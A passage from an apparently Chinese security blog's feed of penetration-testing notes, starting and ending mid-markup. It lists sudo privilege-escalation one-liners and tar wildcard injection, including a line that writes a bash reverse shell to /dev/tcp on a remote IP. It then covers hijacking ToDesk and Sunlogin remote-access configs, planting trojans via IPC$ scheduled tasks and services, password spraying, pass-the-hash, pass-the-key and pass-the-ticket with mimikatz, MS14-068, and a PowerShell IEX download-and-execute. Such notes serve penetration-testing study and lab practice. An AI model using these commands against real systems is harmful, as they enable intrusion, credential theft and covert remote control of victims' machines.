class="line">whoami</span><br></pre></td></tr></table></figure><h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>sudo权限的授予&#x2F;etc&#x2F;sudoers中操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cseroad <span class="keyword">ALL</span><span class="operator">=</span>(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>apt<span class="operator">-</span><span class="keyword">get</span></span><br><span class="line">zangsan <span class="keyword">ALL</span><span class="operator">=</span>(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="operator">/</span>tmp<span class="operator">/</span>cat</span><br><span class="line">需要写在<span class="operator">%</span>wheel <span class="keyword">ALL</span><span class="operator">=</span>(<span class="keyword">ALL</span>) <span class="keyword">ALL</span> 命令下面，才不会被覆盖掉</span><br></pre></td></tr></table></figure><p>cseroad表示用户名</p><p>第一个all允许从任何终端访问sudo</p><p>第二个(ALL:ALL)指示sudo命令被允许任意用户、任意组执行</p><p>第三个NOPASSWD表示不需要输入密码即可执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="operator">-</span>l</span><br><span class="line">wget、find、cat、apt、zip、xxd、<span class="type">time</span>、taskset、git、sed、pip、ed、tmux、scp、perl、bash、tar、less、awk、man、vi、env、ftp、ed、screen</span><br><span class="line">sudo vim <span class="operator">-</span>c <span class="string">&#x27;!sh&#x27;</span> </span><br><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span> </span><br><span class="line">sudo xxd &quot;/etc/shadow&quot; <span class="operator">|</span> xxd <span class="operator">-</span>r </span><br><span class="line">sudo env <span class="operator">/</span>bin<span class="operator">/</span>sh </span><br><span class="line">sudo perl <span class="operator">-</span>e <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span> </span><br><span class="line">sudo zip <span class="number">2.</span>zip <span class="number">1.</span>txt <span class="operator">-</span>T <span class="comment">--unzip-command=&quot;sh -c /bin/sh&quot; </span></span><br><span class="line">sudo sed <span class="operator">-</span>n <span class="string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> <span class="operator">/</span>etc<span class="operator">/</span>passwd </span><br><span class="line">sudo find <span class="operator">/</span>etc<span class="operator">/</span>passwd <span class="operator">-</span><span class="keyword">exec</span> <span class="operator">/</span>bin<span class="operator">/</span>sh \; </span><br><span class="line">sudo tar <span class="operator">-</span>czf xxx.tgz x.html <span class="comment">--checkpoint=1 --checkpoint-action=exec=whoami</span></span><br><span class="line">两条命令提权的 </span><br><span class="line">sudo git help config </span><br><span class="line"><span class="operator">!</span><span class="operator">/</span>bin<span class="operator">/</span>sh </span><br><span class="line">sudo ftp </span><br><span class="line"><span class="operator">!</span><span class="operator">/</span>bin<span class="operator">/</span>sh </span><br><span class="line">sudo less <span class="operator">/</span>etc<span class="operator">/</span>hosts </span><br><span class="line"><span class="operator">!</span>sh </span><br><span class="line">sudo ed </span><br><span class="line"><span class="operator">!</span><span class="operator">/</span>bin<span class="operator">/</span>sh </span><br><span class="line">sudo man man </span><br><span class="line"><span class="operator">!</span><span class="operator">/</span>bin<span class="operator">/</span>sh</span><br></pre></td></tr></table></figure><h3 id="WS通配符提权"><a href="#WS通配符提权" class="headerlink" title="WS通配符提权"></a>WS通配符提权</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; <span class="operator">&gt;</span> <span class="comment">--help</span></span><br><span class="line">劫持help</span><br><span class="line">echo &quot;&quot; <span class="operator">&gt;</span> <span class="comment">--checkpoint=1</span></span><br><span class="line">echo &quot;&quot; <span class="operator">&gt;</span> <span class="comment">--checkpoint-action=exec=ipconfig</span></span><br><span class="line">劫持tar命令</span><br></pre></td></tr></table></figure><p>tar -cvf html.tgz &#x2F;var&#x2F;www&#x2F;html *</p><p>反弹shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot;<span class="operator">&gt;</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="comment">--checkpoint=1</span></span><br><span class="line">echo &quot;&quot;<span class="operator">&gt;</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="comment">--checkpoint-action=exec=&#x27;bash shell.sh&#x27;</span></span><br><span class="line">echo &quot;bash -i &gt;&amp;/dev/tcp/192.168.45.131/8888 0&gt;&amp;1&quot; <span class="operator">&gt;</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.sh </span><br></pre></td></tr></table></figure><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>John</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="comment">--wordlist=xxx.txt shadow.txt</span></span><br></pre></td></tr></table></figure><h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><p>UDF提权</p><p>UDF(User Define Function)，用户自定义函数，用来满足需求</p><p>用c语言或者c++写好一个dll文件，然后放在mysql目录下 </p><p>UDF&#x3D;&#x3D;xxx.dll –&gt;&gt;mysql的目录下</p><p>然后就能在mysql中进行调用了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> xxx();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动</title>
      <link href="/posts/039900e735dd/"/>
      <url>/posts/039900e735dd/</url>
      
        <content type="html"><![CDATA[<p>发现了内网渗透的狠资料，很强</p><p><a href="https://xz.aliyun.com/t/15367#toc-9">https://xz.aliyun.com/t/15367#toc-9</a></p><p>上线远控工具，可以直接通过RDP等服务连接其他电脑。</p><h3 id="RustDESK"><a href="#RustDESK" class="headerlink" title="RustDESK"></a>RustDESK</h3><p>上传到目标靶机上，运行。找到RustDesk.toml</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Roaming\RustDesk\config</span><br></pre></td></tr></table></figure><p>下载到本地后进行添加密码，密码为6位</p><p>然后上传替换即可</p><h3 id="GoToHTTP-要钱"><a href="#GoToHTTP-要钱" class="headerlink" title="GoToHTTP(要钱)"></a>GoToHTTP(要钱)</h3><p>使用B2C模式。只需要在被控端下载即可，使用浏览器远控对面</p><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028316-7.png" alt="img"></p><p>上传到靶机，运行后直接查看同目录下的config.ini，能发现明文账号密码</p><h3 id="todesk篇-会被报警，因为用的太多了"><a href="#todesk篇-会被报警，因为用的太多了" class="headerlink" title="todesk篇(会被报警，因为用的太多了)"></a>todesk篇(会被报警，因为用的太多了)</h3><p>类向日葵远控工具。</p><p>由于官方自己提供了静默安装，所以任意新版本都行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ToDesk.exe /S</span><br></pre></td></tr></table></figure><p>然后就是寻找账号密码，然后进行远控即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">type</span> C:\<span class="string">&quot;Program Files (x86)&quot;</span>\ToDesk\config.ini</span><br></pre></td></tr></table></figure><p>查看tempAuthPassEx的加密值进行解密即是密码，或者说将其进行覆盖。</p><p>使用本地的todesk的config.ini文件替换目标机器的config.ini即可</p><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-1.png" alt="img"></p><p>这个是设备识别码</p><p>这个是临时密码</p><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-2.png" alt="img"></p><p>将本地的这个config.ini上传到目标机器覆盖掉它的config.ini，重启进程即可</p><h3 id="向日葵篇（漏洞已失效，但是可以进行文件替换）"><a href="#向日葵篇（漏洞已失效，但是可以进行文件替换）" class="headerlink" title="向日葵篇（漏洞已失效，但是可以进行文件替换）"></a>向日葵篇（漏洞已失效，但是可以进行文件替换）</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Oray\SunloginClient\config.ini </span><br></pre></td></tr></table></figure><p>使用向日葵绿色版进行运行，会在注册表中添加数值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Oray\SunLogin\SunloginClient</span><br></pre></td></tr></table></figure><p>通过提前输入向注册表中写入数值，即可绕过弹出页面框，直接进行控制</p><p>11.reg：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span> </span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Oray\SunLogin\SunloginClient] </span><br><span class="line"><span class="string">&quot;11.1.0.37237_IsRunSeted&quot;</span>=<span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure><p>运行11.reg即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit -s <span class="number">11.</span>reg  注册注册表</span><br><span class="line">SunloginClient.exe 运行向日葵</span><br></pre></td></tr></table></figure><p>可以通过运行向日葵后截图进行查看密码，但是会有需要点击向日葵页面才能让那个验证码出来</p><p>所以这里会有一个方法将那个验证码不需要点击就能查看</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">type</span> C:\ProgramData\Oray\SunloginClient\config.ini</span><br><span class="line">fastcode:本机识别码去掉k</span><br><span class="line">encry_pwd:本机识别码，密文无法直接解密</span><br></pre></td></tr></table></figure><p>如果不在config.ini中就在sys_config.ini中</p><p>向日葵识别码解密使用脚本即可解密</p><p>Sunflower.zip</p><p>暂时无法在飞书文档外展示此内容</p><p>运行SunDecrypt.py即可</p><h3 id="计划任务横向移动-环境可能只有老电脑能跑"><a href="#计划任务横向移动-环境可能只有老电脑能跑" class="headerlink" title="计划任务横向移动(环境可能只有老电脑能跑)"></a>计划任务横向移动(环境可能只有老电脑能跑)</h3><p>比如只有windows server 2008</p><p>IPC(Internet ProcessConnection)共享”命名管道”的资源。是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用</p><p>通过IPC$,可以与目标机器建立连接。不仅可以访问目标机器中的文件，进行上传、下载等操作。还可以在上面运行其他命令，获取目标机器的目录结构、用户列表等信息</p><p>利用条件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>开启了<span class="number">139</span>、<span class="number">445</span>端口</span><br><span class="line">ipcs可以实现远程登录及对默认共享资源的访问，而<span class="number">139</span>端口的开启表示NetBIOS协议的应用。通过<span class="number">139</span>、<span class="number">445</span>端口可以实现对共享文件打印机的访问，因此一般来说，ipcs需要<span class="number">139</span>、<span class="number">445</span>端口的支持</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>管理员开启了默认共享和IPC服务</span><br><span class="line">默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c、d、e)等和胸痛目录winnt或者windows(adminS)通过ipc可以实现对这些共享目录的访问，使用net share进行查看</span><br></pre></td></tr></table></figure><p>首先建立一个IPC$</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.41</span><span class="number">.30</span>\ipc$<span class="string">&quot;密码&quot;</span> /user:administrator</span><br><span class="line">net use <span class="comment">//查看本地网络连接</span></span><br><span class="line">dir \\xxx.xxx.xxx.xxx\c$</span><br></pre></td></tr></table></figure><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-3.png" alt="img"></p><p>利用方式-windows自带命令</p><p>然后可能会有权限问题,需要过uac认证</p><p><a href="https://www.freebuf.com/articles/network/332619.html">https://www.freebuf.com/articles/network/332619.html</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dir命令</span><br><span class="line">使用netuse命令与远程目标</span><br><span class="line">tasklist 查看进程</span><br><span class="line">查看时间，准备计划任务 net time \\xxx.xxx.xxx.xxx</span><br><span class="line">复制文件 <span class="built_in">copy</span> 文件 \\xxx.xxx.xxx.xxx\C$</span><br><span class="line">建立计划任务</span><br><span class="line">schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f</span><br><span class="line">或者</span><br><span class="line">schtasks /create /u 账号 /p 密码 /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f</span><br></pre></td></tr></table></figure><h3 id="系统服务横向移动"><a href="#系统服务横向移动" class="headerlink" title="系统服务横向移动"></a>系统服务横向移动</h3><p>先建立IPC连接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\xxx.xxx.xxx.xxx\ipc$ <span class="string">&quot;admin@123&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure><p>将木马上传</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\xxx.exe \\xxx.xxx.xxx.xxx\c$</span><br></pre></td></tr></table></figure><p>创建服务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xxx create 服务名称 binpath=<span class="string">&quot;cmd.exe /c c:\xxx.exe&quot;</span></span><br></pre></td></tr></table></figure><p>这里&#x2F;c就是执行完命令后关闭窗口</p><p>启动服务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xxx start 服务名称</span><br></pre></td></tr></table></figure><p>服务隐藏()&#x2F;服务伪装()</p><h3 id="Password-Spraying密码喷洒攻击和域内用户枚举-枚举用户"><a href="#Password-Spraying密码喷洒攻击和域内用户枚举-枚举用户" class="headerlink" title="Password Spraying密码喷洒攻击和域内用户枚举(枚举用户)"></a>Password Spraying密码喷洒攻击和域内用户枚举(枚举用户)</h3><p>原理：</p><p>Kerberos本身是一种基于身份认证的协议，在kerberos协议认证的第一阶段AS-REQ，当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP的返回包不一样。所以可以利用这一点，对有域内进行域用户枚举和密码喷洒攻击。在AS-REQ阶段客户端向AS发送用户名，AS对用户名进行验证，用户存在和不存在返回的数据包不一样，所以根据AS的返回包来对域用户进行枚举.</p><p>密码喷洒用一个密码去碰撞很多账号，以避免账号被锁定的问题</p><p>条件</p><p>但当我们用非域内用户时，是不能直接通过这个来命令来查询的。当主机不在域内但是可以域内通信的时候或者在域内但是不是域账户的登录的时候。我们可以采用域控通信进行枚举。</p><p>下面的工具可参考</p><p>工具</p><p>kerbrute工具(用的最多)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br></pre></td></tr></table></figure><p>暂时无法在飞书文档外展示此内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute.exe passwordspray -d 域名 用户名字典 指定的密码</span><br></pre></td></tr></table></figure><p>CrackMapExec</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></p><p>密码喷洒，然后进行流量代理</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 域名 -u 用户名字典 -p 指定的密码 --<span class="keyword">continue</span>-on-success</span><br></pre></td></tr></table></figure><p>DomainPasswordSpray.ps1</p><p>必须是域用户或者是system才行，虽然是system本来就算域用户</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module DomainPasswordSpray.ps1 导入</span><br><span class="line">Invoke-DomainPasswordSpray -UserList <span class="number">1.</span>txt -Domain xxx.com -Password 指定的密码 -OutFile xxx.txt</span><br></pre></td></tr></table></figure><p>暂时无法在飞书文档外展示此内容</p><p>其他的命令可以去搜一下,在这里可能需要加上-Force进行强制执行，否则无法成功执行</p><p>如果想在cs中无文件落地进行执行的话</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell.exe -exec bypass -command <span class="string">&quot;&amp;&#123;import-module 在本地的文件地址;执行的命令，比如说Invoke-DomainPasswordSpray -UserList 1.txt -Domain xxx.com -Password 指定的密码 -OutFile xxx.txt&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>远程执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell ‐exec bypass ‐c IEX (New‐ObjectSystem.Net.Webclient).DownloadString(<span class="string">&#x27;http://xxx.xxx.xxx.xxx:8080/Invoke‐Portscan.ps1&#x27;</span>);<span class="keyword">import</span>‐module .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts xxx.xxx.xxx<span class="number">.0</span>/<span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h3 id="PTH-Pass-the-Hash-哈希传递-重要"><a href="#PTH-Pass-the-Hash-哈希传递-重要" class="headerlink" title="PTH(Pass the Hash)哈希传递(重要)"></a>PTH(Pass the Hash)哈希传递(重要)</h3><p>深度好文：</p><p><a href="https://xz.aliyun.com/t/8117?time__1311=n4+xnD0Dc7GQDtfK0KDsA3xCq=ErTDgQcApoD">https://xz.aliyun.com/t/8117?time__1311=n4%2BxnD0Dc7GQDtfK0KDsA3xCq%3DErTDgQcApoD</a></p><p>测试环境:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows server2008</span><br></pre></td></tr></table></figure><p>将抓取到的NTLM Hash值进行传递。将域管的NTLM Hash传递给另外的机器，进行登录</p><p>哈希传递前提：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有管理员的NTLM Hash，并且目标机器开放<span class="number">445</span>端口，并且，两台机器的administrator用户账号密码相同</span><br></pre></td></tr></table></figure><p>在工作组环境中：</p><p>Windows vista之前的机器，可以使用本地管理员组内进行攻击</p><p>Windows vista之后的机器，只能是使用administrator用户的hash才能进行hash传递攻击</p><p>在域环境中：</p><p>只有管理员组内用户(可以是域管理员组内不是administrator用户)的hash才能进行hash传递攻击，攻击成功后，可以访问域内任意一台同密码机器</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:xxx.com /ntlm:xxxxxxxxxxxxxxx&quot;</span></span><br></pre></td></tr></table></figure><p>这里输入完之后是会弹出一个框的，在该弹框中输入内容比如说访问被控的机器是可以的，但是如果是自己手动去开一个窗口，在那里会显示未知的窗口</p><p>创建计划任务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192.168</span><span class="number">.41</span><span class="number">.20</span> /tn test1 /sc onstart /tr c:\wanli.exe /ru system /f</span><br></pre></td></tr></table></figure><p>启动计划任务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s <span class="number">192.168</span><span class="number">.41</span><span class="number">.20</span> /i /tn <span class="string">&quot;test1&quot;</span></span><br></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>直接在需要攻击进的域内机器右键运行psexec_psh即可</p><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-4.png" alt="img"></p><p>选中然后修改domain、执行会话。就可以自动攻击</p><p>psexec_psh的使用可以学习下面这个文章</p><p><a href="https://blog.csdn.net/qq_44874645/article/details/121394678">https://blog.csdn.net/qq_44874645/article/details/121394678</a></p><h3 id="Pass-the-Key-PTK-密钥传递攻击"><a href="#Pass-the-Key-PTK-密钥传递攻击" class="headerlink" title="Pass the Key(PTK)密钥传递攻击"></a>Pass the Key(PTK)密钥传递攻击</h3><p>WinXP&#x2F;2003&#x2F;Vista&#x2F;2008，以及未打补丁之前的Win7&#x2F;2008r2&#x2F;8&#x2F;2012这些可以进行NTLM Hash传递，因为可以抓到NTLM明文</p><p>只有在windows8.1&#x2F;2012r2，或者打了补丁的才能复现PTK</p><h5 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h5><p>禁止本地管理员用于远程连接，这样就无法以本地管理员用户的权限执行wmi、psexec、schtasks、at和访问文件共享</p><p>在补丁之后常规的PassTheHash无法成功，唯独默认的Administrator(SID500)账号除外，这个账号依旧可以进行PassTheHash远程连接，即使修改了名字，只需要这个SID500存在即可。</p><p>但是这个补丁能力不强。已经拿到机器了，拿Administrator很轻松，只能减少存储在内存中的凭证数据，也就是让wdigest协议认证的凭证不会存储在lsass.exe，使得我们抓取明文密码的时候无法成功</p><p>除此之外还可以使用AES密钥进行替代NTLM验证进行横向操作。</p><h4 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h4><p>在被控的机器上抓取key</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br></pre></td></tr></table></figure><p>查看到域管的aes256_hmac值，将其进行传递</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:xxxx.com /aes256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>即可</p><p>然后需要注意的是，由于传递的是域控的aes256值，虽然可以访问任意机器，但是不能使用ip进行访问，只能使用域名进行访问</p><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC.xxx<span class="number">-1.</span>com\C$</span><br></pre></td></tr></table></figure><p>就行了</p><h3 id="Pass-The-Ticket-PTT-票据传递攻击-维权用的"><a href="#Pass-The-Ticket-PTT-票据传递攻击-维权用的" class="headerlink" title="Pass The Ticket(PTT)票据传递攻击(维权用的)"></a>Pass The Ticket(PTT)票据传递攻击(维权用的)</h3><p>就是黄金票据和白银票据，看前面的就行</p><h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::kickets /export&quot;</span>  <span class="comment">//把所有的票据进行导出</span></span><br><span class="line">shell klist purge</span><br><span class="line">或者</span><br><span class="line">mimikatz kerberos::purge  <span class="comment">//清除票据</span></span><br></pre></td></tr></table></figure><p>高权限的票据文件注入内存</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt pttxxxxxx</span><br></pre></td></tr></table></figure><p>上线</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc.xxx.com</span><br><span class="line"><span class="built_in">copy</span> C:\xxx\xxx.com \\dc.xxx.com\C$</span><br><span class="line">shell schtasks /create /s dc.xxx.com /tn test /sc onstart /tr c:\wanli.exe /ru system /f </span><br><span class="line">shell schtasks /run /s dc.xxx.com /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure><h4 id="用CS"><a href="#用CS" class="headerlink" title="用CS"></a>用CS</h4><p>直接用就行</p><p>把ntlm hash 和sid传进去就行</p><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>非常牛，不需要再去找到域管理的NTLM Hash、ase256值之类的，直接将普通用户变成域管</p><p>原理：</p><p>在server2000以上的域控服务器中，通过伪造域管的TGT将普通用户权限提升为域管权限，以此来控制域控。只要服务器没有打漏洞ms14-068的补丁(KB3011780)，都可以进行利用</p><p>MS14-068利用条件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取域普通用户账号密码</span><br><span class="line">获取域普通用户的sid</span><br><span class="line">服务器未打补丁</span><br></pre></td></tr></table></figure><p>环境windows server2008</p><p>查看域用户的SID</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p>清除内存中的票据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>生成凭证</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14<span class="number">-068.</span>exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控</span><br></pre></td></tr></table></figure><p>导入票据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据名字</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.xxx.com\C$  <span class="comment">//不能用ip，得用机器名</span></span><br></pre></td></tr></table></figure><p>建立网络连接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc.xxx.com</span><br></pre></td></tr></table></figure><p>复制恶意文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> xxx.exe \\dc.xxx.com</span><br></pre></td></tr></table></figure><p>添加计划任务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s dc.xxx.com /tn test /sc onstart /tr xxx.exe /ru system /f </span><br></pre></td></tr></table></figure><p>启动计划任务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s dc.xxx.com /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure><p>即可上线</p><h3 id="goldenPac-exe"><a href="#goldenPac-exe" class="headerlink" title="goldenPac.exe"></a>goldenPac.exe</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe 域名/域用户名:域用户明文密码@域控完整域名</span><br></pre></td></tr></table></figure><p> 票据传递一键利用工具</p><h3 id="PsExec工具远程命令执行横向移动-老了，被杀软盯死了，而且日志太多"><a href="#PsExec工具远程命令执行横向移动-老了，被杀软盯死了，而且日志太多" class="headerlink" 